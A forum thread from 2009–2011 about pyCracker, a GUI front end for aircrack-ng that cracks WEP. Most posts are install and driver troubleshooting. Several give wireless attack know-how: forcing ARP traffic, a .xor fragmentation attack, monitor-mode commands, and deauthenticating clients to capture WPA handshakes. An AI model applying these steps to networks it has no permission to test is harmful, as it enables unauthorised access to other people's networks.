I tried a clientless attack once and was unable to get any arp requests or generate a .xor packet. So I cheated by turning myself into a client with a wired connection and connecting/disconnecting the cable. (Actually I did this on another access point configured with the same SSID/password so I didn't have to access the other AP I was trying to "crack". Surprisingly, the .xor packet generated this way worked on the second AP.)
Then I was able to get a .xor packet with which I successfully performed a clientless attack by fragmentation attack. :)

P.S: The aircrack site seems to currently be down. :(
Does anybody know what's going on?

---

### Post by Sprut1 on 2009-04-19
> **dazzler said:**
> Out of interest how long does a typical attack take to gain the wep keys using pyCracker.

I've managed to get it working on my eeepc701 now, installed eeebuntu standard, rejigged it with madwifi drivers and everythings up and running.

Trouble is did a quick test on my router and it was saying like 29days or more for it to complete, obviously i declined at that point :o

> **KIAaze said:**
> I haven't tried out pycracker yet, but since it uses aircrack, I suppose it's pretty much the same:
Once you get a .xor file or once you captured an ARP request (not sure of the correct terms), it's cracked in about 5-10 minutes max. :)

Also, once you cracked it once, you can reuse specific files (like the .xor packet or the .cap files) and crack it quickly again.

The time to get the ARP request/xor packet depends on the traffic. The more traffic on the network, the faster it's cracked.
For your first tests, I recommend artificially generating an ARP request from another PC on the network by pinging some IP address (don't remember if it must be an existing IP or not). You may also disconnect/reconnect the PC from/to the network.


I tried a clientless attack once and was unable to get any arp requests or generate a .xor packet. So I cheated by turning myself into a client with a wired connection and connecting/disconnecting the cable. (Actually I did this on another access point configured with the same SSID/password so I didn't have to access the other AP I was trying to "crack". Surprisingly, the .xor packet generated this way worked on the second AP.)
Then I was able to get a .xor packet with which I successfully performed a clientless attack by fragmentation attack. :)

P.S: The aircrack site seems to currently be down. :(
Does anybody know what's going on?

KIAaze sums it up nicely here for you dazzler. I can't really say why it is saying 29 days, I must get the output of debug to see what is going on, if all attacks are firing and injection is working it should take way less time.

---

### Post by KIAaze on 2009-04-19
I found out why it's down: [http://aircrack-ng.blogspot.com/2009/04/website-down.html](http://aircrack-ng.blogspot.com/2009/04/website-down.html)

A bad time to try to get drivers working (their site is still the best resource for this). ^^

---

### Post by kerry_s on 2009-04-19
> **Sprut1 said:**
> KIAaze sums it up nicely here for you dazzler. I can't really say why it is saying 29 days, I must get the output of debug to see what is going on, if all attacks are firing and injection is working it should take way less time.

could it be the eee 701 is just to slow? if i remember right it's like 6??mhz, slow 2gb/4gb ssd.

---

### Post by dazzler on 2009-04-20
> **kerry_s said:**
> could it be the eee 701 is just to slow? if i remember right it's like 6??mhz, slow 2gb/4gb ssd.

Probably, thanks for all the input guys.

Guess i'll just wait for a new release and get it going on my bigger laptop.

:KS

---

### Post by atomhearth on 2009-04-21
Sorry for the bad english!
  I am new at Linux!
 I need some help here if it' s possible...Thanks!
So, when i start the program, there are  some messages like this one:

Couldn' t find a valid interface, put one in managed mode.

In the interface section there is:

wlan0        Monitor           2.412GHz

...but i can' t do anything.

Where i rong?
Thanks again!Oh , and i have to say that i drag and drop pyCracker.py file into the terminal 'couse i couldn' t install or open it other way

---

### Post by dazzler on 2009-04-21
> **atomhearth said:**
> Sorry for the bad english!
  I am new at Linux!
 I need some help here if it' s possible...Thanks!
So, when i start the program, there are  some messages like this one:

Couldn' t find a valid interface, put one in managed mode.

In the interface section there is:

wlan0        Monitor           2.412GHz

...but i can' t do anything.

Where i rong?
Thanks again!Oh , and i have to say that i drag and drop pyCracker.py file into the terminal 'couse i couldn' t install or open it other way

Have you tried clicking on create in the interfaces tab, you want one in monitor mode and one in managed mode

---

### Post by Malacoda103 on 2009-04-22
so i just tried the command 
```
~/Desktop/pyCracker$ sudo python pyCracker.py

```

which returned the message:
```
Traceback (most recent call last):
  File "pyCracker.py", line 16, in <module>
    import Modules
  File "/home/malacoda/Desktop/pyCracker/Modules/__init__.py", line 5, in <module>
    import Cracker
  File "/home/malacoda/Desktop/pyCracker/Modules/Cracker.py", line 5, in <module>
    import Functions
  File "/home/malacoda/Desktop/pyCracker/Modules/Functions.py", line 1, in <module>
    import wx
ImportError: No module named wx

```

I'm assuming this is something simple as no one else has encountered it?
I'm extremely new to linux so please bare with me..

---

### Post by KIAaze on 2009-04-23
cf the original post:
> Okay so this is what you need:

- Python runtime
- wxPython (wxwidgets 2.8 )
- aircrack-ng suit ([http://www.aircrack-ng.org](http://www.aircrack-ng.org))
- Patched networking drivers (read about this on [http://www.aircrack-ng.org](http://www.aircrack-ng.org))
- root access
- some available space for .cap files


You just need to install the [python-wxgtk2.8]("apt:python-wxgtk2.8") package.

You'll also need [aircrack-ng]("apt:aircrack-ng") .

The patched networking drivers requirement is the hardest. I don't think there's a newbie friendly solution for this yet (someone should make debian packages of patched drivers ^^).
The best reference on patching drivers is currently down unfortunately: [http://www.aircrack-ng.org/](http://www.aircrack-ng.org/)

Alternatively, you can try their forum [http://forum.aircrack-ng.org/index.php](http://forum.aircrack-ng.org/index.php) or use google cache for example: [http://209.85.129.132/search?q=cache:YFDbgQWu_0gJ:aircrack-ng.org/doku.php%3Fid%3Dcompatibility_drivers+aircrack+atheros&cd=1&hl=en&ct=clnk&client=firefox-a](http://209.85.129.132/search?q=cache:YFDbgQWu_0gJ:aircrack-ng.org/doku.php%3Fid%3Dcompatibility_drivers+aircrack+atheros&cd=1&hl=en&ct=clnk&client=firefox-a)

But if you're lucky, maybe you won't need to patch them.
Just tell us what wireless card you have and maybe we can help you. :)

Note: You could try the [backtrack live-CD]("http://www.remote-exploit.org/backtrack_download.html") since it's supposed to come with most patched drivers (didn't work for me :/).
backtrack hardware compatibility list: [http://backtrack.offensive-security.com/index.php/HCL:Wireless](http://backtrack.offensive-security.com/index.php/HCL:Wireless)

---

### Post by Malacoda103 on 2009-04-23
> **KIAaze said:**
> 
But if you're lucky, maybe you won't need to patch them.
Just tell us what wireless card you have and maybe we can help you. :)


D-Link AirPlus XtremeG DWL-G520 PCI Wireless Adapter.

I think it's an Atheros chipset from what i can find on the net.

I guess i have another question, the patch i'll be applying to my driver what does it change?

---

### Post by Sprut1 on 2009-04-23
> **Malacoda103 said:**
> D-Link AirPlus XtremeG DWL-G520 PCI Wireless Adapter.

I think it's an Atheros chipset from what i can find on the net.

I guess i have another question, the patch i'll be applying to my driver what does it change?

I also stated that this application won't help at all if you have no clue what aircrack-ng does. Please start off with wiemans tutorial and read up on driver patching on aircrack-ng.org

---

### Post by Malacoda103 on 2009-04-23
> **Sprut1 said:**
> I also stated that this application won't help at all if you have no clue what aircrack-ng does. Please start off with wiemans tutorial and read up on driver patching on aircrack-ng.org

I do know what aircrack does as a program, this does not mean i understand the patch i will be applying, which what i asked for clarification on. I will read the tutorial on the patching again more thoroughly, and then ask more specific questions i guess.

---

### Post by Vadi on 2009-04-23
Yeah, unfortunately unlike most graphical applications, this one isn't designed to be intuitive. You have to know how to work with the console version and the general process before you look into this.

---

### Post by Sprut1 on 2009-04-24
> **Malacoda103 said:**
> I do know what aircrack does as a program, this does not mean i understand the patch i will be applying, which what i asked for clarification on. I will read the tutorial on the patching again more thoroughly, and then ask more specific questions i guess.

No problem, asking questions is good, I just don't think you'll get any answear here that suffice. Reading the documentation availbable probably is the best thing to do :)

> **Vadi said:**
> Yeah, unfortunately unlike most graphical applications, this one isn't designed to be intuitive. You have to know how to work with the console version and the general process before you look into this.

Correct, and also; those who have no clue what so ever is probably using the software with the wrong intentions. pyCracker is simply meant to make the hassle of all the terminal windows and different command easier, and the process alot faster.


Edit: Now that Jaunty is out I will continue on the new version of pyCracker which is ported to pyGTK instead of wxPython. I'll post screenshots on a later occasion.

---

### Post by dazzler on 2009-04-24
> **Sprut1 said:**
> 
Edit: Now that Jaunty is out I will continue on the new version of pyCracker which is ported to pyGTK instead of wxPython. I'll post screenshots on a later occasion.

:guitar:

</me wipes the drool of his chin>

---

### Post by Sprut1 on 2009-04-25
Okay, I said I was going to post screen-shots, so here they are. The design is pretty much the same, but optimised. The configure network screenshot shows the dialog where you can start a cracker using manual settings instead of selecting from the list, which should have been implemented a long time ago. The settings are now organised and removed from the tabbar, they way it should be.

I hope this teased those who have tried earlier versions of pyCracker.

---

### Post by Vadi on 2009-04-25
Small tip: it should be Cancel | Save in the first screenshot, and use stock buttons / buttons with images on the 4th one

---

### Post by Sprut1 on 2009-04-25
> **Vadi said:**
> Small tip: it should be Cancel | Save in the first screenshot, and use stock buttons / buttons with images on the 4th one

I agree on the forth one, but in the first you don't actually "Save" anything, it's more like Ok/Done configuring what network to start cracking. Thanks for the tips!

---

### Post by dazzler on 2009-04-25
Looking good, any guestimates on an ETA Release date ;)

---

### Post by Vadi on 2009-04-25
> **Sprut1 said:**
> I agree on the forth one, but in the first you don't actually "Save" anything, it's more like Ok/Done configuring what network to start cracking. Thanks for the tips!

Then just use a single "Close" button. I'd also really recommend (in the nice way) to read the Gnome 2.2 HIG - they are really good guidelines.

---

### Post by Sprut1 on 2009-04-26
> **dazzler said:**
> Looking good, any guestimates on an ETA Release date ;)

Nope, it has a long way to go before it is completely converted and working. I'll try to keep you updated.

> **Vadi said:**
> Then just use a single "Close" button. I'd also really recommend (in the nice way) to read the Gnome 2.2 HIG - they are really good guidelines.

I've read it and trying to build the user interface accordingly. Thanks for the tip once again :)

---

### Post by CodJohn on 2009-05-05
Hi!
I've encountered a problem while setting up the program, it might be something I haven't considered or done wrong, as I am rather new to Linux.

Any help would be appreciated^^

I only have one network in range, my own, which I intend to use for testing and such. However, when I try to start cracking, the program tells me to put a network in managed mode. I saw someone suggesting I'd use the create function, but then I get an error with wlanconfig, "Error creating interface". In terminal it says: > wlanconfig: ioctl: No such deviceIf any more info is required, let me know, and I'll post it.

---

### Post by Kilon on 2009-05-06
> **Sprut1 said:**
> 


Edit: Now that Jaunty is out I will continue on the new version of pyCracker which is ported to pyGTK instead of wxPython. I'll post screenshots on a later occasion.


What is the reason for preferring pyGTK instead of wxPython ?

---

### Post by dazzler on 2009-05-09
> **CodJohn said:**
> Hi!
I've encountered a problem while setting up the program, it might be something I haven't considered or done wrong, as I am rather new to Linux.

Any help would be appreciated^^

I only have one network in range, my own, which I intend to use for testing and such. However, when I try to start cracking, the program tells me to put a network in managed mode. I saw someone suggesting I'd use the create function, but then I get an error with wlanconfig, "Error creating interface". In terminal it says: If any more info is required, let me know, and I'll post it.

What do you get when you run 'iwconfig' in terminal?

---

### Post by CodJohn on 2009-05-10
> **dazzler said:**
> What do you get when you run 'iwconfig' in terminal?

```
iwconfig:
lo        no wireless extensions.

eth0      no wireless extensions.

wifi0     no wireless extensions.

ath0      IEEE 802.11g  ESSID:"Tussa-Hotspot"  Nickname:""
          Mode:Managed  Frequency:2.462 GHz  Access Point: 00:1E:13:7B:B5:D0   
          Bit Rate:1 Mb/s   Tx-Power:9 dBm   Sensitivity=1/1  
          Retry:off   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality=8/70  Signal level=-87 dBm  Noise level=-95 dBm
          Rx invalid nwid:4690  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

pan0      no wireless extensions.

```

---

### Post by dazzler on 2009-05-11
> **CodJohn said:**
> ```
iwconfig:
lo        no wireless extensions.

eth0      no wireless extensions.

wifi0     no wireless extensions.

ath0      IEEE 802.11g  ESSID:"Tussa-Hotspot"  Nickname:""
          Mode:Managed  Frequency:2.462 GHz  Access Point: 00:1E:13:7B:B5:D0   
          Bit Rate:1 Mb/s   Tx-Power:9 dBm   Sensitivity=1/1  
          Retry:off   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality=8/70  Signal level=-87 dBm  Noise level=-95 dBm
          Rx invalid nwid:4690  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

pan0      no wireless extensions.

```

try 'sudo airmon-ng start ath0'
then check with iwconfig that its started in monitor mode

**Sprut1 if your still around, if you need any Beta testers for the new version gimme a pm ;)**

---

### Post by Sprut1 on 2009-05-14
> **Kilon said:**
> What is the reason for preferring pyGTK instead of wxPython ?

Glade3.

> **dazzler said:**
> **Sprut1 if your still around, if you need any Beta testers for the new version gimme a pm ;)**

Thanks, I'll just release it whenever it's usable, but I hope you test it then.

---

### Post by j00fek on 2009-05-15
just got everything going on a rtl8187 chipset, installed madwifi tools and cant create an interface through iwconfig

[ New session ] 
23:24:38 | 1 | /Init | Loading completed in 0.96s 
23:24:38 | 2 | /Init | System: posix 
23:24:44 | 3 | /wlanconfig | Error creating interface

not sure if this app will work in 9.04 in vmware

---

### Post by Sprut1 on 2009-05-16
> **j00fek said:**
> just got everything going on a rtl8187 chipset, installed madwifi tools and cant create an interface through iwconfig

[ New session ] 
23:24:38 | 1 | /Init | Loading completed in 0.96s 
23:24:38 | 2 | /Init | System: posix 
23:24:44 | 3 | /wlanconfig | Error creating interface

not sure if this app will work in 9.04 in vmware

In not sure myself :)

Try wlanconfig manually from terminal, then report back the result.

---

### Post by dazzler on 2009-05-16
> **Sprut1 said:**
> In not sure myself :)

Try wlanconfig manually from terminal, then report back the result.

You need a usb adaptor if your using vmware, is that what you are using?

---

### Post by j00fek on 2009-05-17
im on vmware 6.5 w/9.04 

rosewill rnx-g1w usb w/realek 8187 chipset

my wlanconfig

ngr@ubuntu:~$ wlanconfig
usage: wlanconfig athX create [nounit] wlandev wifiY
            wlanmode [sta|adhoc|ap|monitor|wds|ahdemo] [uniquebssid]
usage: wlanconfig athX destroy
usage: wlanconfig athX list [active|ap|caps|chan|freq|keys|scan|sta|wme]
ngr@ubuntu:~$

seems as if i have to set my card up manually, my wlanconfig is from mad-wifi

ill keep trying to get the card implemented, and ck back

thanks for the program

---

### Post by j00fek on 2009-05-18
> **dazzler said:**
> You need a usb adaptor if your using vmware, is that what you are using?

yes, it is enabled when i start the machine from the vmware menu

---

### Post by MediocreHippie on 2009-05-23
i need some help.

i just installed pycracked, but i have a few questions.

it says wlanconfig isnt installed... but im pretty sure it is. how can i resolve this?

and

how can i create a launcher for this so i dont have to dc to a folder and run the command every time i want to use it?

any help appreciated.


EDIT:  i got wlanconfig installed, and it doesnt give me the error message anymore. but it wont let me refresh networks. it tells me to put a device in managed mode. when i right click wlan0, and click managed, it does nothing.

help?

---

### Post by toddvarg on 2009-06-17
I made the gui working, but it couldn't find any network. I put in the terminal```
iwconfig
```, and could see that I'am using ```
wlan0
```.
Than I put in the terminal```
sudo airmon-ng start wlan0
```.
After that I start the gui with ```
sudo python pycracker.py
```, as you have said.
The pycracker starts, but when the > Warning: Agreement of usegives med the option of saying yes or no, and i press the yesbutton, the pycracker close down. :( It's almost like a bug of some sort. Anybody have a good ide?

---

### Post by lalitgaur on 2009-07-01
I am getting the following error when I try to crack the WEP network.
```

/bin/sh: Syntax error: "(" unexpected
/bin/sh: Syntax error: "(" unexpected
python: ../../src/XlibInt.c:600: _XPrivSyncFunction: Assertion `(dpy->flags & (1L << 3)) != 0' failed.
Aborted

```

---

### Post by Therax on 2009-07-19
**What steps will reproduce the problem?**
1.Install BT4, using b43 driver
2.in terminal run sudo airmon-ng wlan0 start
3.Choose network to crack

**What is the expected output? What do you see instead?**
That it starts cracking.     It fails with packet injection then nothing

**What version of the product are you using? On what operating system?**
pyCracker-0.0.7.1-alpha
Backtrack 4 pre relese

**Please provide any additional information below.**
I dont know whats the problem i tried with what they said on the other
issu but i did not work. I guess its a bug.
Heres the other issu
[http://code.google.com/p/pycracker/issues/detail?id=12](http://code.google.com/p/pycracker/issues/detail?id=12)

---

### Post by notaloafer on 2009-07-31
Hello! This program looks like an awesome utility but I'm having a problem with it! Whenever I select a network and click "Crack" the program crashes out and Terminal displays the following:

```

/bin/sh: Syntax error "(" unexpected
/bin/sh: Syntax error "(" unexpected
python: Fatal IO error 11 (Resource temporarily unavailable) on X server :0.0.

```

This displays after the program closes out. If I try to re-start the program after it crashes, it refuses to find any networks until I reboot the whole machine.

Another question I have is will this program crack both WEP and WPA/WPA2 networks or just WEP?

Thanks!
-Eric

---

### Post by lemmy999 on 2009-08-01
No this app won't crack WPA crypto as that requires the capture of the 4 way handshake initiated when a client authenticates with the wireless router. The only way to capture that is to wait for client log-on or force a de-authentication of the client to produce the required log on.

I'm not even sure that the software writer(Sprut1) is even continuing with this app as he hasn't been here for some time ( May 16th)

---

### Post by damers21 on 2009-08-20
I have been having a similar error mentioned pages back in this topic.  When I start the program I get the error "Notice: 'wlanconfig' is not installed on you system.  The 'Interfaces' tab will be disabled."  I recall it being mentioned that you can create your own interfaces manually in order to bypass this.  Does anyone have any suggestions on how to do this?

---

### Post by iFritz on 2009-08-28
Same problem here. After starting the pyCracker, choosing my network to crack, following shows up in the terminal:
[PHP]/bin/sh: Syntax error "(" unexpected
[/PHP]
pyCracker stucks now and is doing nothing. Not even quitting the program is possible. Only strg+c works then.

---

### Post by malathion on 2009-09-08
Thank you for this terrific tool.

I'm sorry to report that the instructions for patching my network drivers on Aircrack.org are completely over my head and I don't even know where to begin. Can someone point me to some more noob-friendly advice on how to determine which patch I need for my wireless NIC and what to do? :confused:

---

### Post by hovrashko on 2009-09-12
eric@eric-laptop:~/pyCracker$ sudo python pyCracker.py
[sudo] password for eric:
Traceback (most recent call last):
  File "pyCracker.py", line 16, in <module>
    import Modules
  File "/home/eric/pyCracker/Modules/__init__.py", line 5, in <module>
    import Cracker
  File "/home/eric/pyCracker/Modules/Cracker.py", line 5, in <module>
    import Functions
  File "/home/eric/pyCracker/Modules/Functions.py", line 1, in <module>
    import wx
ImportError: No module named wx
eric@eric-laptop:~/pyCracker$

[B]=( its not working, i cant even start it. 
 Does anyone know why?[/B]

---

### Post by bear24rw on 2009-09-12
> **hovrashko said:**
> eric@eric-laptop:~/pyCracker$ sudo python pyCracker.py
[sudo] password for eric:
Traceback (most recent call last):
  File "pyCracker.py", line 16, in <module>
    import Modules
  File "/home/eric/pyCracker/Modules/__init__.py", line 5, in <module>
    import Cracker
  File "/home/eric/pyCracker/Modules/Cracker.py", line 5, in <module>
    import Functions
  File "/home/eric/pyCracker/Modules/Functions.py", line 1, in <module>
    import wx
ImportError: No module named wx
eric@eric-laptop:~/pyCracker$

[B]=( its not working, i cant even start it. 
 Does anyone know why?[/B]

you need to install the python wx module search the repos for it

---

### Post by hovrashko on 2009-09-12
> **bear24rw said:**
> you need to install the python wx module search the repos for it
thanks  a lot, GUI is working, will see if it functioning =)

---

### Post by greenman111 on 2009-09-16
edit... done.

---

### Post by simartem on 2009-09-27
thank you very much for your efforts on programming this. Can you tell us which programming language did you use to create this program ? I want to know which languages are there to create "Window" based software like yours.

---

### Post by KIAaze on 2009-09-27
> **simartem said:**
> thank you very much for your efforts on programming this. Can you tell us which programming language did you use to create this program ? I want to know which languages are there to create "Window" based software like yours.

Here's what he used: [http://www.wxpython.org/](http://www.wxpython.org/)

Python GUI alternatives:
[http://www.pygtk.org/](http://www.pygtk.org/)
[http://wiki.python.org/moin/PyQt](http://wiki.python.org/moin/PyQt)

All of those are wrappers for the following C or C++ libraries:
[http://www.wxwidgets.org/](http://www.wxwidgets.org/)
[http://www.gtk.org/](http://www.gtk.org/)
[http://qt.nokia.com/products](http://qt.nokia.com/products)

Another solution for GUIs is Gambas:
[http://gambas.sourceforge.net/en/main.html](http://gambas.sourceforge.net/en/main.html)

---

### Post by simartem on 2009-09-27
> **KIAaze said:**
> Here's what he used: [http://www.wxpython.org/](http://www.wxpython.org/)

Python GUI alternatives:
[http://www.pygtk.org/](http://www.pygtk.org/)
[http://wiki.python.org/moin/PyQt](http://wiki.python.org/moin/PyQt)

All of those are wrappers for the following C or C++ libraries:
[http://www.wxwidgets.org/](http://www.wxwidgets.org/)
[http://www.gtk.org/](http://www.gtk.org/)
[http://qt.nokia.com/products](http://qt.nokia.com/products)

Another solution for GUIs is Gambas:
[http://gambas.sourceforge.net/en/main.html](http://gambas.sourceforge.net/en/main.html)

Thank you so much. :) I will start learning these languages.

---

### Post by moldy on 2009-09-27
Hi Mate

Just testing our your excellent program - but have encountered the following error which dumped me:

lo        no wireless extensions.

eth0      no wireless extensions.

wmaster0  no wireless extensions.

pan0      no wireless extensions.

lo        no wireless extensions.

eth0      no wireless extensions.

wmaster0  no wireless extensions.

pan0      no wireless extensions.

/bin/sh: Syntax error: "(" unexpected
/bin/sh: Syntax error: "(" unexpected
python: ../../src/xcb_io.c:242: process_responses: Assertion `(((long) (dpy->last_request_read) - (long) (dpy->request)) <= 0)' failed.
Aborted

I suspect it may have something to do with the Madwifi - but to be honest, I'm not a pro at this, so am unsure...

Any ideas?

---

### Post by joris1977 on 2009-09-29
Similar program, but more advanced and less buggy (though still buggy) is Gerix wifi cracker

Find it here:

[http://backtrack.it/~emgent/hackstuff/Gerix-Wifi-Cracker-NG/index-en.html](http://backtrack.it/~emgent/hackstuff/Gerix-Wifi-Cracker-NG/index-en.html)

There is a .deb down on the page. There is not much documentation available about it, but if you understand a little bit about wireless hacking it will be easy to get what it is doing. There are also some youtube videos with terrible music available ;) 

Gerix wifi cracker should be included in the coming backtrack 4 release. An Os dedicated to hacking/testing. If you think that backtrack 4 will solve all your wireless testing problems, be warned. It is broken on weird parts, even kismet isn't working out of the box.

 On the website they claim Gerix-wifi-cracker already is included in Backtrack 4 , but that is not the case. It is easy to apt-get it though since backtrack 4 is based on kubuntu(intrepid) 

Backtrack 4 has a newer version of Gerix-wifi-cracker than you can find on their site, but still somewhat buggy

---

### Post by juancarlospaco on 2009-09-29
Dont forget that Python got its own built-in graphic toolkit, apt:/python-tk

---

### Post by KIAaze on 2009-09-29
> **juancarlospaco said:**
> Dont forget that Python got its own built-in graphic toolkit, apt:/python-tk

I didn't know about that one, but it seems it's just a wrapper (or [object-oriented layer]("http://wiki.python.org/moin/TkInter")) for the [tk toolkit]("http://en.wikipedia.org/wiki/Tk_%28framework%29"). :P
I only heard of tk with tcl before.

Thanks to joris1977 for the tip about Gerix. :)

---

### Post by c-m on 2009-10-05
I have a problem with this. 

I run an acer aspire one laptop and use the ath5k driver. Now i can manually and quite easily crack my WEP network using the command line. 

Now if i load pyCracker, I get the nice gui interface. I can select my network from the list, but when I hit the crack button the program exits. it almost seems like a problem with X as it complains that screen 0 is in use by another process.

---

### Post by dazzler on 2009-10-08
> **joris1977 said:**
> Similar program, but more advanced and less buggy (though still buggy) is Gerix wifi cracker

Find it here:

[http://backtrack.it/~emgent/hackstuff/Gerix-Wifi-Cracker-NG/index-en.html](http://backtrack.it/~emgent/hackstuff/Gerix-Wifi-Cracker-NG/index-en.html)

There is a .deb down on the page. There is not much documentation available about it, but if you understand a little bit about wireless hacking it will be easy to get what it is doing. There are also some youtube videos with terrible music available ;) 

Gerix wifi cracker should be included in the coming backtrack 4 release. An Os dedicated to hacking/testing. If you think that backtrack 4 will solve all your wireless testing problems, be warned. It is broken on weird parts, even kismet isn't working out of the box.

 On the website they claim Gerix-wifi-cracker already is included in Backtrack 4 , but that is not the case. It is easy to apt-get it though since backtrack 4 is based on kubuntu(intrepid) 

Backtrack 4 has a newer version of Gerix-wifi-cracker than you can find on their site, but still somewhat buggy

Hey thanks for the tip, but can you tell me how to start it, ive installed the .deb package, tried launching it from the terminal without success

**Never mind found it myself, sorry**

---

### Post by Habboblob on 2009-10-28
I tried installing it but I recieve this error:

```
stephan@stephan-laptop:~/Desktop/pycracker$ sudo python pyCracker.py
Traceback (most recent call last):
  File "pyCracker.py", line 16, in <module>
    import Modules
ImportError: No module named Modules

```

---

### Post by Lockheed on 2009-11-10
> **dazzler said:**
> Hey thanks for the tip, but can you tell me how to start it, ive installed the .deb package, tried launching it from the terminal without success

**Never mind found it myself, sorry**

You evil, evil person. Why don't you share your knowledge with others who may need it?
```
sudo python /usr/share/gerix-wifi-cracker-ng/gerix.py
```

---

### Post by criser80 on 2009-12-07
Another a GUI for aircrack-ng:
[http://forum.aircrack-ng.org/index.php?topic=6329.0](http://forum.aircrack-ng.org/index.php?topic=6329.0)

---

### Post by Astrals on 2009-12-23
> **Lockheed said:**
> You evil, evil person. Why don't you share your knowledge with others who may need it?
```
sudo python /usr/share/gerix-wifi-cracker-ng/gerix.py
```


  Thank you for posting this great help.  
Yes I have to agree. Why else do we use these forums but to either get or post help.

---

### Post by Sprut1 on 2010-02-09
Hi all,

I do apolagize in advance if bringing up this old thread is against the forums policies.

I just want to say that the work on pyCracker, obviously, stopped in May 2009 because of hardware crash at my end. I do have some project files left and as I recall I ported the application to GTK before the project was discontinued. If anyone is interested I'll upload everything I have to google code.

I'm sorry for not replying on posts here on the forum and issue reports at google code as all feedback is most appriciated.

At this moment I am still working with python and reading python books as usual, but I don't have Ubuntu running on any machine and therefore not playing around with the aircrack-ng suite.

Thanks,
Sprut1

---

### Post by psdoc on 2010-02-09
Would be awesome! Maybe someone will pick it up and continue it. Did anyone check out WEPcrack? I found it on the Aircrack-ng site, and it`s pretty well done.

---

### Post by linux000019 on 2010-03-05
what ever happened to this program? it seems like it would be pretty simple to script the functions and then ask for user input like ESSID or BSSID.

---

### Post by linux-hack on 2010-08-18
Wow rely nice the app Sprut1. I posted this on my site so more people can try it out. It's rely nice to have a little GUI for aircrack-ng even if I like a lot the command line.

---

### Post by jfb112697 on 2011-05-09
Hey all i am pretty new to cracking ive done a few with the terminal aircrack but i think pycracker is a good idea, but i can not figure out how to use it i downloaded it from that page, and i opened pycracker.py and well... i can open it with gedit or terminal i opened it with terminal the window came up for a second and then closed

---

### Post by doc_b4 on 2011-08-16
/home/joe/Desktop/Screenshot.png

---

